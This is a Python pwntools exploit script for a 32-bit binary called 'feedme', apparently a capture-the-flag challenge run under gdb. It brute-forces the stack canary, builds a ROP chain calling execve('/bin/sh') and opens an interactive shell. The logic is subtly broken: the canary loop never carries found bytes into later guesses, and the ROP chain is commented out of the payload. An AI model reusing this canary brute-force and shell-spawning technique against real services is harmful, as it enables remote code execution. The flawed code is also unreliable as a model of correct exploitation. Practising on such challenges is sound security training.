#!/usr/bin/python3
import pwn
import sys
binary = "./feedme"
pwn.context.binary = binary
pwn.context.encoding = "latin"
pwn.context.kernel = "i386"
pwn.context.update(arch='i386', os='linux')

packer = pwn.make_packer(8, endian="little", sign="unsigned")
rop = pwn.ROP(binary, base=0x7fffe000)

debug = ""
with open("breakpoints.gdb", "r") as io:
    debug = io.read()

def brute_force_canary(io):
    canary = b""
    padding = b"A"*96
    for i in range(4):
        for x in range(256):
            payload = padding + packer(x) 
            io.send(payload)
            output = io.readrepeat(.1).decode()
            if "stack smashing" not in output:
                print("guess successful")
                canary += packer(x)
                break
    return canary

padding = 96
payload = b"A"*padding
with pwn.gdb.debug(binary, gdbscript=debug) as io:
    bin = pwn.ELF(binary)

    rop.call('execve', [b'/bin/sh', 0, 0])
    print(rop.dump())

    canary = brute_force_canary(io)
    padding_canary = 96
    padding_after_canary = 12
    payload = pwn.flat(
        b"A"*padding_canary,
        canary,
        b"A"*padding_after_canary
        #rop.chain()
    )
    io.send(payload)
    io.interactive()